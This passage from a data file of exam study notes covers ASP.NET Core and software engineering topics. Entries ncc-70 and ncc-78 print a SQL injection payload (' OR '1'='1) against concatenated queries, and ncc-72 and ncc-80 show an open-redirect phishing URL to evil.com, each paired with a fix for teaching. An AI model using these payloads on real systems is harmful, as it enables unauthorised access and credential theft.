xUnit, NUnit or MSTest, using Moq for dependencies; run with dotnet test.\n• Integration tests with WebApplicationFactory<Program> and TestServer, calling the API in memory.\n• UI and end-to-end tests with Playwright or Selenium; load tests with k6 or JMeter.\n• dotnet test --collect:\"XPlat Code Coverage\" for coverage, and the same command in CI on every push.\n• Follow the test pyramid: many unit tests, fewer integration, few end-to-end."},"ncc-65":{"u":3,"logic":"Two definitions in one question; the HTTP half is often answered with a status-code list instead of the protocol's nature, and MVC must include the request flow.","how":"Half a page for HTTP (stateless, methods, status), half for MVC plus the Kestrel-to-view flow.","skel":["HTTP: stateless request/response over TCP","Methods, status codes, headers, body","Model, View, Controller definitions","Flow: Kestrel, middleware, routing, action","Benefits: separation, testability"],"ans":"HTTP (HyperText Transfer Protocol) is the stateless, text-based request/response protocol of the web, running over TCP on port 80 (HTTPS on 443 with TLS). The client sends a method (GET, POST, PUT, DELETE), a URL, headers and an optional body; the server answers with a status code (200, 404, 500), headers and an optional body. Stateless means each request is independent of the last.\n\nMVC pattern - three parts:\n• Model - data and business rules (entities, validation).\n• View - presentation template (Razor .cshtml) that renders the model.\n• Controller - receives the routed request, calls the model or service, returns an action result (View, Json, Redirect).\n\nRequest flow: Kestrel receives the request, middleware runs, routing selects the action, the action builds or fetches the model, the view renders HTML.\nBenefits: separation of concerns, testable controllers, parallel development, clean URLs, and one controller serving HTML or JSON. Example: /Student/Details/5 calls StudentController.Details(5)."},"ncc-66":{"u":4,"logic":"Tests the pattern and the framework component as separate ideas; many answers define DI and then call the container 'a DI library'.","how":"DI in two lines with the new-versus-ask contrast, container as the resolver, one registration block, three lifetimes.","skel":["DI: dependencies passed in, not created","Constructor injection, interface typed","Container: registers, resolves, disposes","Singleton, Scoped, Transient","Benefits: coupling and testing"],"ans":"Dependency injection - a class does not create its dependencies; it declares them, usually in the constructor, and an outside party supplies them. Instead of new StudentService(), the controller asks for IStudentService. Control over which implementation is used is inverted.\n\nIoC container - the framework component that performs that inversion: it registers type mappings, builds the object graph, resolves constructor parameters recursively, manages lifetimes and disposes objects. ASP.NET Core has one built in (Microsoft.Extensions.DependencyInjection).\n\nbuilder.Services.AddScoped<IStudentRepository, StudentRepository>();\nbuilder.Services.AddScoped<IStudentService, StudentService>();\npublic class StudentController : Controller {\n    private readonly IStudentService _svc;\n    public StudentController(IStudentService svc) => _svc = svc;\n}\n\nLifetimes: Singleton (one instance for the application), Scoped (one per HTTP request), Transient (new on every resolve).\nBenefits: loose coupling, easy mocking in unit tests, one place to swap an implementation, automatic lifecycle management. Avoid the service-locator pattern."},"ncc-67":{"u":4,"logic":"Repeats the tag-helper idea from 2080 but adds Razor syntax, so it tests whether you can write a view, not just define a term.","how":"Tag helper in three lines, then the @ syntax ladder - model, expression, block, if, foreach - then a form.","skel":["Tag helper: server-side attribute, TagHelper class","Enabled by addTagHelper in ViewImports","Razor: @model, @Model.Name, @{ }","Control flow with @if, @foreach","Form with asp-for and validation span"],"ans":"Tag helper - a server-side attribute (asp-for, asp-action, asp-validation-for) that Razor converts into HTML at render time. It is a C# class deriving from TagHelper, enabled by @addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers in _ViewImports.cshtml. It gives model binding, URL generation, validation markup, anti-forgery tokens and cache-busting, while the view still looks like plain HTML.\n\nRazor syntax - C# inside .cshtml, introduced by @:\n@model Student                        // strongly typed model\n<h2>@Model.Name</h2>                  // expression, HTML-encoded\n@{ var total = Model.Marks.Sum(); }   // code block\n@if (total > 40) { <p>Pass</p> }      // control flow\n@foreach (var c in Model.Courses) { <li>@c.Title</li> }\n\n<form asp-action=\"Create\" method=\"post\">\n  <input asp-for=\"Name\" />\n  <span asp-validation-for=\"Name\" class=\"text-danger\"></span>\n</form>\nRazor compiles into C# that writes HTML. @ escapes the value; @Html.Raw does not, which is an XSS risk."},"ncc-68":{"u":1,"logic":"A pick-two short-note set that rewards compact, example-led definitions; Docker is the usual weak spot because students describe a VM instead.","how":"Three notes of about 45 words: lambda syntax, event as guarded delegate, container versus VM.","skel":["Lambda: parameters => body, LINQ use","Delegate type, event restricts +=","Docker: image plus containers","Shares host kernel, lighter than VM"],"ans":"Lambda expression - an anonymous function, parameters => body. x => x * 2 is an expression lambda; (a, b) => { return a + b; } is a statement lambda. It converts to a delegate such as Func<int,int> or to an expression tree, and is the backbone of LINQ: students.Where(s => s.Marks > 40).\n\nDelegates and events - a delegate is a type-safe pointer to a method with a fixed signature: public delegate void Notify(string msg); An event restricts that delegate with the event keyword, so subscribers can only += and -=, never invoke or overwrite:\npublic class Button { public event Notify Clicked; public void Click() => Clicked?.Invoke(\"hi\"); }\nThe button knows nothing about the form listening - publisher-subscriber coupling.\n\nDocker and containerisation - Docker packages an app with its runtime and dependencies into an image; a container is a running instance that shares the host kernel, so it starts in seconds and is far lighter than a VM. Multi-stage Dockerfile (SDK build, aspnet runtime), docker build -t app ., docker run -p 8080:80, registry, Kubernetes."},"ncc-69":{"u":1,"logic":"Tests three related C# fundamentals at once; the custom exception must actually be thrown and caught, and most answers forget to inherit from Exception.","how":"Struct and enum in contrast lines, three reasons for handling, then the custom exception class plus try/catch.","skel":["Struct: value type, copied, no inheritance","Enum: named constants only","Handle: avoid crash, log, clean up","class MyException : Exception","Throw, catch, finally"],"ans":"Struct - a value type holding data and behaviour: fields, properties, methods, can implement interfaces, cannot inherit or be inherited, is copied on assignment, and lives on the stack or inline in its container. Use it for small values such as Point or Money.\n\nEnum - a distinct value type whose members are named constants of an underlying integral type (int by default): enum Status { Pending = 1, Paid, Shipped }. It has no fields or methods, only names; cast with (int)Status.Paid, parse with Enum.Parse, combine with [Flags]. Use it for a fixed set of choices, not for data.\n\nWhy handle exceptions: an unhandled exception ends the request and can crash the process; handling shows a friendly message, logs the cause, releases resources in finally, keeps data consistent and maps the error to 400, 404 or 500.\n\npublic class InvalidMarksException : Exception {\n    public InvalidMarksException(string m) : base(m) { }\n}\ntry {\n    int marks = 120;\n    if (marks < 0 || marks > 100) throw new InvalidMarksException($\"{marks} is out of range\");\n} catch (InvalidMarksException ex) { Console.WriteLine(ex.Message); }\nfinally { /* release resources */ }"},"ncc-70":{"u":9,"logic":"Combines the CLI pipeline with a security demo; the marks are in the ordered commands and a query that visibly returns every row.","how":"Number the seven commands, then six lines of vulnerable code with the crafted input and the fixed version.","skel":["new, restore, build, run, test","publish -c Release, then host","Env vars and migrations","Concatenated query plus ' OR '1'='1","Parameterised fix"],"ans":"Procedure:\n1. dotnet new mvc -n CollegeApp creates the project.\n2. dotnet restore pulls NuGet packages; dotnet build compiles to bin/Debug.\n3. dotnet run starts Kestrel on localhost:5000 (or F5 in Visual Studio).\n4. dotnet test runs the test project.\n5. dotnet publish -c Release -o ./publish produces the deployable output: dll, Views, wwwroot, appsettings.\n6. Copy it to the server; install the ASP.NET Core Hosting Bundle for IIS (or publish --self-contained), create the site with ANCM, reverse-proxy Nginx to Kestrel, or build a Docker image.\n7. Set ASPNETCORE_ENVIRONMENT=Production and connection strings as environment variables, apply EF migrations, enable HTTPS, then smoke-test.\n\nSQL injection demo:\nstring sql = \"SELECT * FROM Users WHERE Name='\" + txtName.Text + \"'\";\n// attacker enters:  ' OR '1'='1\nThe query becomes SELECT * FROM Users WHERE Name='' OR '1'='1', which returns every row, so the page lists all users.\nFixed: var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name=@n\", con); cmd.Parameters.AddWithValue(\"@n\", txtName.Text);\nThe input is now data, never SQL."},"ncc-71":{"u":3,"logic":"Tests why statelessness is a design advantage (not a flaw) and then whether you can write an EF Core insert, not an ADO.NET one.","how":"Five advantage bullets, one cost line, then the Employee class, DbContext and a six-line insert method.","skel":["Any server can serve any request","No per-user memory, easy to scale","Crash-safe and cache friendly","State must be carried or stored","Add plus SaveChangesAsync"],"ans":"Stateless HTTP - each request carries everything the server needs, and the server keeps no memory of earlier requests.\nAdvantages:\n• Scalability - any server in the farm can serve any request, so load balancers add nodes freely.\n• Low server memory; no per-user session objects to replicate.\n• Resilience - a crashed node loses nothing, the client simply retries.\n• Caching and CDN friendliness; GET responses can be cached.\n• Simpler testing, debugging and REST API design, with clean client-server separation.\nCost: state must be carried (cookie, token, hidden field) or stored (session, cache, database).\n\nInsert with EF Core:\npublic class Employee { public int EmployeeId { get; set; } public string Name { get; set; } public int Salary { get; set; } }\npublic class AppDbContext : DbContext {\n    public AppDbContext(DbContextOptions<AppDbContext> o) : base(o) { }\n    public DbSet<Employee> Employees => Set<Employee>();\n}\npublic async Task<int> AddJohn() {\n    var e = new Employee { EmployeeId = 3, Name = \"John\", Salary = 12000 };\n    _db.Employees.Add(e);\n    return await _db.SaveChangesAsync();   // 1 row inserted\n}\nSaveChanges generates INSERT INTO Employee VALUES (3,'John',12000)."},"ncc-72":{"u":9,"logic":"Pairs a phishing-class vulnerability with the container-versus-VM distinction; students lose marks by describing Docker as a virtual machine.","how":"Open redirect as attack URL, victim, fix - then Docker as image/container with three commands.","skel":["Open redirect: unvalidated returnUrl","Trusted domain leads to phishing page","Fix: Url.IsLocalUrl or allowlist","Docker: image plus running container","Shares host kernel, lighter than VM"],"ans":"Open redirect - the application redirects to a URL taken from the request without validating it. After login it runs return Redirect(returnUrl), where returnUrl comes from the query string.\nAttack: the attacker mails a link to the genuine site -\nhttps://bank.com/Account/Login?returnUrl=http://evil.com/fake\nThe victim sees the real domain, logs in, and is bounced to the attacker's copy to re-enter credentials or card details. It also leaks OAuth tokens.\nFix: if (!Url.IsLocalUrl(returnUrl)) returnUrl = \"/\"; or a host allowlist; accept relative paths only.\n\nDocker and containerisation - Docker packages an application with its runtime and configuration into an image; a container is an isolated process started from it, sharing the host kernel, so it is far lighter than a VM.\n• Multi-stage Dockerfile: SDK image compiles, aspnet runtime image runs.\n• docker build -t collegeapp . then docker run -p 8080:80 collegeapp.\n• Same image on laptop, server and cloud; config by environment variable, no secrets baked in.\n• Registries store images; Kubernetes orchestrates scaling and rolling updates."},"ncc-73":{"u":1,"logic":"Tests attribute syntax at the parameter level, then whether you can describe the .NET stack from language down to CLR without confusing CLI with CLR.","how":"Positional equals constructor order, named equals property name; then CLI-CLR-BCL as three layers.","skel":["Positional: constructor arguments, order matters","Named: public properties, any order","CLI defines CTS, CLS, VES","CLR: JIT, GC, type safety","Principles: cross-platform, modular, side-by-side"],"ans":"Positional parameters - values passed to the attribute's constructor, in the order declared:\n[Obsolete(\"Use SaveAsync instead\", true)]\n[Route(\"api/[controller]\")]\nThe order and types must match, and they are compulsory when the constructor requires them.\n\nNamed parameters - set public properties or fields by name, in any order, optional:\n[Obsolete(message: \"Use SaveAsync\", error: true)]\n[Display(Name = \"Age\", Order = 2)]\nThey are read through reflection and make intent readable.\n\n.NET architecture: languages (C#, F#, VB) compile to MSIL plus metadata inside an assembly; the CLR loads it, JIT-compiles IL to native code and manages garbage collection, type safety and exceptions. CLI is the specification - CTS for types, CLS for language interoperability, VES for execution. BCL/FCL supplies the class libraries, and NuGet packages extend them.\nDesign principles: cross-platform and open source, modular packages, side-by-side versioning, performance-first, built-in dependency injection and configuration, one unified stack for MVC, Web API, Razor, SignalR and gRPC."},"ncc-74":{"u":3,"logic":"Tests message-level HTTP knowledge; a status-code list without the start line, headers, blank line and body loses most marks.","how":"Draw two blocks - request then response - with the blank line shown, then label each part underneath.","skel":["Start line, headers, blank line, body","Request: method, path, version","Response: version, status, reason","Headers: Host, Content-Type, Set-Cookie","Body only when there is one"],"ans":"HTTP messages are plain text: a start line, headers, a blank line, then an optional body.\n\nRequest:\nGET /students/5?sem=6 HTTP/1.1\nHost: college.edu.np\nUser-Agent: Mozilla/5.0\nAccept: text/html\nCookie: .AspNet.Cookies=abc123\n\n(blank line; body only for POST/PUT, e.g. name=Ram&age=20 or JSON)\n\nResponse:\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 512\nSet-Cookie: theme=dark; HttpOnly\nCache-Control: no-cache\n\n<html>...</html>\n\nThe request start line carries method, path and version; the response start line carries version, status code and reason. Headers are Name: value pairs - Host, Accept, Authorization, Cookie in the request; Content-Type, Content-Length, Set-Cookie in the reply. The body carries form data, JSON or HTML; a JSON POST sets Content-Type: application/json."},"ncc-75":{"u":7,"logic":"Tests whether you can justify validation beyond 'the teacher said so', then whether you can implement it in React state rather than plain HTML attributes.","how":"Four reasons first, then a controlled input with an error state and a submit guard.","skel":["Stop bad data reaching the database","Enforce rules, give fast feedback","Reduce server load, resist injection","React: useState for value and error","Validate in submit, keep server check"],"ans":"Why validate a form:\n• Stop bad data entering the database - empty name, age 200, invalid e-mail, phone not 10 digits.\n• Enforce business rules and required fields before a costly round trip.\n• Give instant feedback so the user is not sent back after submitting.\n• Reduce server load and reject injection-style input early.\n• Keep trust - a form that accepts garbage looks broken.\nClient validation is UX only; the server must validate again.\n\nIn React, use controlled components and state:\nconst [name, setName] = useState(\"\");\nconst [err, setErr] = useState(\"\");\nfunction submit(e) {\n  e.preventDefault();\n  if (name.trim().length < 3) { setErr(\"Name needs 3+ characters\"); return; }\n  setErr(\"\");   // then call the API\n}\n<input value={name} onChange={e => setName(e.target.value)} />\n{err && <span className=\"text-danger\">{err}</span>}\nValidate on change or on blur; HTML5 required, type=\"email\", pattern and minLength give free checks; Formik or React Hook Form with Yup suits large forms."},"ncc-76":{"u":5,"logic":"Tests EF Core vocabulary (model versus context) and routing as mapping rather than file lookup; the pair is often answered with one word each.","how":"Model equals classes, context equals DbContext with DbSets, then routing with one pattern and one attribute example.","skel":["Data model: entity classes and rules","Data context: DbContext, DbSet, tracking","AddDbContext, inject into controller","Routing maps URL to action, not file","Pattern with defaults and constraints"],"ans":"Data model - the C# classes that represent tables and their relationships, with validation rules:\npublic class Movie {\n    public int Id { get; set; }\n    [Required] public string Name { get; set; }\n    public string Genre { get; set; }\n}\nConfigured with data annotations or the Fluent API in OnModelCreating.\n\nData context - the DbContext subclass, a session with the database. It holds DbSet<T> properties, the connection options, change tracking and SaveChanges:\npublic class AppDbContext : DbContext {\n    public AppDbContext(DbContextOptions<AppDbContext> o) : base(o) { }\n    public DbSet<Movie> Movies => Set<Movie>();\n}\nRegistered with AddDbContext and injected into controllers or repositories.\n\nURL routing - mapping an incoming URL to a controller action and its parameters, not to a file. Conventional {controller=Home}/{action=Index}/{id?} makes /Movie/Details/5 call MovieController.Details(5). Attribute routing uses [Route(\"api/[controller]\")] with constraints such as {id:int}. Benefits: clean SEO-friendly URLs, patterns in one place, link generation through Url.Action and asp-action."},"ncc-77":{"u":6,"logic":"Wants working session code plus the fact that it must be enabled in the pipeline; forgetting UseSession is the common failure.","how":"Three lines of setup, then set/get/remove in a controller, then one line on scale-out.","skel":["AddSession with idle timeout","UseSession before endpoints","SetString, GetString, SetInt32","Clear on logout","Redis for a web farm"],"ans":"HTTP is stateless, so ASP.NET Core session stores per-user values on the server, keyed by a session cookie.\n\nEnable it in Program.cs:\nbuilder.Services.AddDistributedMemoryCache();\nbuilder.Services.AddSession(o => {\n    o.IdleTimeout = TimeSpan.FromMinutes(20);\n    o.Cookie.HttpOnly = true;\n    o.Cookie.IsEssential = true;\n});\napp.UseSession();\n\nUse it in a controller:\nHttpContext.Session.SetString(\"UserName\", \"ram\");\nHttpContext.Session.SetInt32(\"CartCount\", 3);\nstring user = HttpContext.Session.GetString(\"UserName\");\nint n = HttpContext.Session.GetInt32(\"CartCount\") ?? 0;\nHttpContext.Session.Remove(\"CartCount\");\nHttpContext.Session.Clear();   // logout\n\nIn a view: @Context.Session.GetString(\"UserName\").\nSession expires after the idle timeout. On a web farm use a distributed cache such as Redis or SQL Server so every node sees the same session, and keep stored values small - never secrets or large objects."},"ncc-78":{"u":8,"logic":"Reverses question 45: it tests prevention, so the parameterised command must be shown, not just named.","how":"Six numbered defences with the parameter code at number one, then the vulnerable line for contrast.","skel":["Parameterised query with @n and @p","Stored procedures or an ORM","Validate and whitelist input","Least-privilege database login","No dynamic SQL, hide errors"],"ans":"1. Parameterised queries - the value travels separately from the SQL text, so it can never become code:\nstring sql = \"SELECT * FROM Users WHERE Name=@n AND Password=@p\";\nvar cmd = new SqlCommand(sql, con);\ncmd.Parameters.AddWithValue(\"@n\", txtUser.Text);\ncmd.Parameters.AddWithValue(\"@p\", txtPass.Text);\nVulnerable contrast: \"... WHERE Name='\" + txtUser.Text + \"'\" - entering  ' OR '1'='1  logs in as the first user.\n2. Use stored procedures with parameters, or an ORM such as EF Core, which parameterises for you.\n3. Validate and whitelist input - int.TryParse for ids, length and character checks.\n4. Give the application a least-privilege database login: no db_owner, no DROP rights.\n5. Never build SQL with EXEC or dynamic strings from input.\n6. Hide detailed error pages and log them server-side.\n7. Patch frameworks and keep a WAF as a second layer.\nEscaping quote characters is not a fix; parameterisation is."},"ncc-79":{"u":9,"logic":"A repeat of the deployment half of questions 41 and 70, so it is a sure shot; examiners want ordered steps and production settings.","how":"Seven numbered steps from configuration to health check; this repeats 41 and 70, so it is a sure shot.","skel":["Set Production environment and secrets","dotnet publish -c Release","Host: IIS, Nginx or Docker","Apply migrations, set permissions","HTTPS, health check, rollback"],"ans":"1. Configure the environment: ASPNETCORE_ENVIRONMENT=Production, with connection strings and secrets in environment variables or a key vault, never in source.\n2. dotnet publish -c Release -o ./publish - produces the app dll, dependencies, Views, wwwroot and appsettings.json.\n3. Choose the host: IIS with the ASP.NET Core Hosting Bundle and a site pointed at the publish folder (in-process), or Nginx/Apache reverse-proxying to Kestrel, or a Docker image from a multi-stage Dockerfile.\n4. Publish self-contained (dotnet publish -r win-x64 --self-contained) when the runtime cannot be installed on the server.\n5. Copy to the server, set folder permissions, and apply EF migrations with dotnet ef database update.\n6. Run it as a Windows service or systemd unit, enable HTTPS with HSTS, and open only ports 80 and 443.\n7. Verify the health endpoint, logs, static files and a full login flow; keep the previous release for rollback."},"ncc-80":{"u":1,"logic":"A pick-two set mixing a C# feature, a security flaw already asked elsewhere, and a state technique - it checks breadth of recall.","how":"Three 50-word notes: LINQ with both syntaxes, open redirect with the fix, query string with its limits.","skel":["LINQ: query over IEnumerable, deferred","Two syntaxes, key operators","Open redirect: unvalidated returnUrl","Query string: after ?, visible, bookmarkable"],"ans":"LINQ - Language Integrated Query: C# syntax for querying any IEnumerable<T> or IQueryable<T> (arrays, lists, EF Core, XML) with compile-time checking. Query syntax: from s in students where s.Marks > 40 select s.Name. Method syntax: students.Where(s => s.Marks > 40).Select(s => s.Name). Operators include Where, Select, OrderBy, GroupBy, Join, FirstOrDefault, Any, Sum and Take/Skip. Execution is deferred until enumeration (ToList materialises it); with EF Core the query is translated to SQL.\n\nOpen redirect - redirecting to a URL taken from the request without validation, e.g. /Login?returnUrl=http://evil.com. The victim trusts the real domain and lands on a phishing page. Fix: Url.IsLocalUrl(returnUrl) or a host allowlist.\n\nQuery string - the name=value pairs after ? in a URL: /Movie/List?page=2&genre=comedy. Read with Request.Query[\"page\"] or a bound action parameter; used for paging, search and filters. It is visible and bookmarkable, so never put passwords or large data there, and always validate it."},"se-1":{"u":8,"logic":"Tests whether you know inspection as a formal static team process with named roles and entry/exit criteria — not just 'someone reads the code'. The roles and the ordered steps carry the marks.","how":"Learn the five roles first, then the six steps in order; a small role-to-step table plus one line on why inspection beats testing.","skel":["Define inspection: static, checklist-based, team review","Roles: moderator, author, inspectors, recorder, domain expert","Steps: planning, overview, preparation, meeting, rework, follow-up","Meeting rule: log defects, not solutions; author silent","Why: finds missing requirements and design defects testing cannot"],"ans":"Software inspection is a formal, static review of a work product (code, design, test plan) by a team, against a checklist, without executing it.\nStakeholders:\n• Moderator/team leader — plans and runs the inspection, keeps it on schedule.\n• Author — produced the artefact; explains it but does not defend it.\n• Inspectors (3–4) — independent reviewers who find defects during preparation.\n• Recorder/scribe — logs each defect, its type and location.\n• Domain expert or customer — optional; checks that requirements are correctly interpreted.\nProcess (Fagan):\n1. Planning — entry criteria, checklist, documents distributed.\n2. Overview — author briefs the team on background.\n3. Individual preparation — each inspector studies alone and lists defects.\n4. Inspection meeting — defects are logged, not solved; the author stays silent.\n5. Rework — author fixes the logged defects.\n6. Follow-up — moderator verifies fixes against exit criteria, then the item is baselined.\nInspection catches missing requirements, wrong logic and poor style that testing cannot reveal."},"se-2":{"u":10,"logic":"Tests whether you see estimation as a management tool, not arithmetic, and whether you can state COCOMO's formula, its three modes and constants, then apply them.","how":"Two-part answer: six one-line advantages, then formula, mode table and one worked substitution. Learn the three constant rows by heart.","skel":["Advantages: pricing/bid, staffing, schedule, feasibility, risk, progress tracking","COCOMO formula: E = a(KLOC)^b, D = c(E)^d","Modes with constants: organic, semi-detached, embedded","Basic vs intermediate (EAF) vs COCOMO II","Worked example: 33.6 KLOC semi-detached ≈ 152 PM"],"ans":"Estimation predicts effort, cost and time before development begins. Advantages:\n• Gives a defensible basis for pricing a bid and negotiating the contract.\n• Allocates staff, budget and tools realistically, avoiding over- or under-staffing.\n• Produces the schedule, milestones and Gantt chart used to monitor progress.\n• Supports feasibility — impossible projects are rejected early.\n• Justifies the contingency reserve and exposes cost drivers.\n• Allows planned-versus-actual tracking of effort and cost.\nCOCOMO (Constructive Cost Model, Boehm) is an algorithmic model:\nEffort E = a × (KLOC)^b person-months; Duration D = c × E^d months; team size = E/D.\nThree modes: organic (small, familiar, in-house), semi-detached (medium, mixed experience), embedded (tight hardware/regulatory constraints, e.g. avionics).\nBasic constants — organic 2.4, 1.05, 2.5, 0.38; semi-detached 3.0, 1.12, 2.5, 0.35; embedded 3.6, 1.20, 2.5, 0.32.\nExample: 33.6 KLOC semi-detached → E = 3.0 × 33.6^1.12 ≈ 152 PM; D = 2.5 × 152^0.35 ≈ 14 months.\nIntermediate COCOMO scales E by an effort adjustment factor from 15 cost drivers; COCOMO II uses object points and scale factors."},"se-3":{"u":2,"logic":"Probes whether you can justify change (business, technology, regulation, understanding) and then name a concrete coping mechanism — most students only list reasons and forget the model.","how":"Six reasons in one line each, then incremental development with a feedback-arrow diagram. The diagram is half the second part.","skel":["Why: business need, competition, technology, regulation, defects, feedback","Lehman: a used system must change or decay","Model: incremental development, prioritised increments","Diagram: requirements with feedback arrow from each increment","Why it copes: change confined, early feedback, lower rework"],"ans":"Software must change because it lives in a changing world:\n• Business needs shift — new products, mergers, revised processes.\n• Competition and user expectations rise; a system that does not improve loses users.\n• Technology moves — new OS, browser, database, cloud platform, security patches.\n• Regulation changes — new tax slabs, privacy rules, reporting formats.\n• Defects and security holes surface only in real use.\n• Requirements are never fully understood first time, so use reveals gaps (Lehman: a system that is used must change or become progressively less useful).\nModel: incremental development. The system is delivered as a series of increments, each a usable slice of prioritised functionality. Requirements are ranked, the first increment is designed, built, tested and delivered, then the next is planned with fresh feedback.\nDraw: requirements at the top, a row of increments below, each with design-build-test-deliver, and a feedback arrow from every increment back to requirements.\nIt copes with change because change is confined to a small increment, users give feedback early, and architecture is refactored rather than rebuilt. Cost: documentation and integration overhead."},"se-4":{"u":1,"logic":"Checks that you can name the ACM/IEEE-style duties by group and then justify them socially — most answers list confidentiality only and lose the 'why important' marks.","how":"Use the eight code headings as your bullets, then two sentences of importance with one concrete risk example.","skel":["Define ethics: professional conduct beyond law","Bullets by duty: public, client, product, judgement","Bullets: management, profession, colleagues, self","Importance: safety, trust, liability","Example: refusing to ship a known security hole"],"ans":"Software engineering ethics is the set of professional standards of conduct (ACM/IEEE code) that guide engineers beyond legal minimums.\n• Public interest — protect safety, privacy and health; disclose risks.\n• Client and employer — act in their interest, keep confidentiality, take no bribes.\n• Product — meet the highest standards, test adequately, make no false claims.\n• Judgement — stay competent, be objective, accept criticism.\n• Management — promote ethical culture, fair treatment, realistic schedules.\n• Profession and colleagues — advance the discipline, credit others' work.\n• Self — keep learning, never misrepresent skills.\nImportance: software now controls money, medical records and public services, so a silent defect harms real people; ethics protects the public, preserves trust in the profession and limits legal liability. Example: refusing to ship a payroll system with a known authentication flaw, even under deadline pressure."},"se-5":{"u":3,"logic":"Tests the classic contrast plus a second half most candidates ignore: how agile is actually managed through backlog, sprints and velocity, not just 'agile is flexible'.","how":"Two short columns of contrasts, then the sprint cycle in order. Write five contrasts and five management practices — five marks each way.","skel":["Plan-driven: fixed requirements, heavy docs, big design up front","Agile: evolving requirements, working software, emergent design","Contrast: change control vs welcome change, size of team","Agile PM: backlog, sprint planning, stand-up, review, retrospective","Track with velocity and burndown; scope flexes, time fixed"],"ans":"Plan-driven development fixes requirements and architecture early, documents heavily, controls change formally and suits large, distributed or safety-critical projects under contract. Agile development assumes requirements will change, delivers working software in short iterations, keeps design emergent through refactoring, and relies on customer collaboration in small co-located teams.\nContrasts: fixed vs evolving requirements; documentation vs working software; big design up front vs continuous design; formal change control vs welcome change; predictive vs adaptive planning.\nAgile project management:\n• Product backlog — every feature as a user story, prioritised by value (MoSCoW) by the product owner.\n• Sprint planning — a fixed timebox of 2–4 weeks and a committed sprint backlog.\n• Daily stand-up — 15 minutes: done, next, blockers.\n• Tracking — velocity (story points per sprint) and a burndown chart.\n• Sprint review and retrospective — demo to the customer, then improve the process.\nTime and team are fixed; scope flexes."},"se-6":{"u":5,"logic":"Checks that you know MDA is a three-level model chain with automatic transformation, not just 'modelling'. The CIM-PIM-PSM sequence is the mark-earner.","how":"Remember C-P-P: CIM, PIM, PSM. Draw three boxes with transformation arrows, then one benefit and one limit each.","skel":["Define MDA: models are primary, code generated","CIM: business view, no computation","PIM: platform-independent UML model","PSM: platform-specific model, then code","Benefit portability; limits tooling, leakage, debugging"],"ans":"MDA is a development approach in which models, not source code, are the primary artefact and code is produced by automated transformation.\n• CIM (computation independent model) — the business view: entities, processes and vocabulary, with no software detail.\n• PIM (platform independent model) — the UML analysis/design model: classes, associations and behaviour, with no technology.\n• PSM (platform specific model) — the PIM transformed for a target such as Java/Spring, .NET or a cloud database; further transformation generates code and schemas.\nDraw: CIM → PIM → PSM → code, with 'transformation' written on each arrow.\nBenefit: one PIM maps to many platforms, so the design is portable, models stay consistent with code and boilerplate is generated. Limits: dependence on tools and standards, platform detail leaks into models, generated code is hard to debug, and the approach is heavy for small projects."},"se-7":{"u":7,"logic":"Tests whether you understand that implementation problems are mostly non-coding (reuse, versions, host-target mismatch) and that each needs a named handling strategy.","how":"Three issue-handle pairs plus two extras; always write the issue then 'Handle:' so the examiner sees the pairing.","skel":["Reuse: mismatch, licence, no control — wrap and pin versions","Configuration management: versions, builds — Git, baselines, CI","Host-target: different platform — cross-compiler, emulator, container","Others: tooling, coding standards, legacy integration","Consequence: these cost more effort than coding"],"ans":"Implementation issues are the practical problems met while turning a design into working code; they often cost more effort than coding.\n• Reuse — building from libraries, frameworks and COTS. Issues: the component never matches requirements exactly, licence terms, unknown quality, and no control over future versions. Handle: evaluate first, wrap it behind your own interface, pin versions and keep an exit path.\n• Configuration management — parallel changes cause lost updates, wrong versions and unreproducible builds. Handle: one repository with a branching policy, baselines, automated CI builds, tagged releases and change control.\n• Host-target development — code is written on a host (laptop, IDE) but runs on a different target (phone, embedded board, server). Handle: matching toolchains, cross-compilers, emulators, identical container images and staged test environments.\n• Others: tool choice, coding standards and review, legacy integration. Plan all of them early — retrofitting costs far more."},"se-8":{"u":8,"logic":"Tests the distinction between the developer's final check before shipping and testing done by real users, plus the three named user-testing types.","how":"Release testing = team, black-box, requirements. User testing = alpha, beta, acceptance. Learn the three words and their one-line definitions.","skel":["Release testing: complete version, by development team, before shipping","Black-box against requirements, realistic data, plus load/security","User testing: users in their own environment","Alpha at developer site; beta at user site","Acceptance: customer decides accept or reject"],"ans":"Release testing is testing of a complete, shippable version by the development team before it leaves the organisation. It is black-box, driven by the system requirements rather than the code, uses realistic data and decides whether the system is good enough to release; it covers functional requirements, performance and load, stress, security, recovery and regression. The release may be a product for sale or a service for one client.\nUser testing lets real users exercise the system in their own environment:\n• Alpha — users test at the developer's site under supervision, so defects are observed directly.\n• Beta — many users test in their own workplace and report defects; realistic but uncontrolled.\n• Acceptance — the customer tests against agreed criteria and formally accepts or rejects the system (UAT sign-off).\nDraw: build → release testing → alpha → beta → acceptance → live."},"se-9":{"u":9,"logic":"Checks a definition and then the ordered maintenance workflow, including impact analysis and regression — most students only list the four types of maintenance.","how":"Define in one line, then six numbered steps from change request to release. Add 'impact analysis' early; it is the step examiners look for.","skel":["Define: post-delivery modification, ~60% of lifecycle cost","Step 1: change request logged and prioritised","Step 2: impact analysis on modules, cost, risk","Step 3: release planning; step 4: change implementation","Step 5: testing and regression; step 6: release and baseline"],"ans":"Software maintenance is the modification of a system after delivery to correct faults, adapt it to a changed environment, or improve performance and maintainability; it absorbs about 60% of lifecycle cost.\n1. Change request — a defect report or enhancement request is logged, classified and prioritised.\n2. Impact analysis — using program structure and documentation, identify affected modules, data and tests; estimate cost and risk.\n3. Release planning — decide which approved changes go into the next release.\n4. Change implementation — modify code, design and data, update documentation and tests, under change control.\n5. Testing — unit test the change and run full regression to prove nothing else broke.\n6. Release — deliver the version, update the baseline and inform users.\nDraw: change request → impact analysis → release planning → implementation → testing → release."},"se-10":{"u":10,"logic":"Tests whether configuration management is understood as identification, control, build and release — not just 'using Git'. Each step must be named.","how":"Six steps in lifecycle order: identify, version, change control, build, release, audit. One line each; the order itself earns marks.","skel":["Define CM: identify, control and track all artefacts","Identification and baselines of configuration items","Version control: repository, branch, history","Change control: request, impact analysis, board approval","Build and release management, then status accounting/audit"],"ans":"Configuration management identifies every artefact (code, documents, data, scripts, test cases), controls changes to it and tracks versions so any release can be rebuilt exactly.\n1. Identification — split the product into configuration items, name each with a version, and define baselines (approved snapshots).\n2. Version control — keep items in a repository (Git) with branching, merging and full history so parallel work is not overwritten.\n3. Change control — raise a change request, analyse its impact, and let a change control board approve or reject it.\n4. Build management — build automatically from the repository with CI on every commit.\n5. Release management — decide release contents, tag, package and distribute.\n6. Status accounting and audit 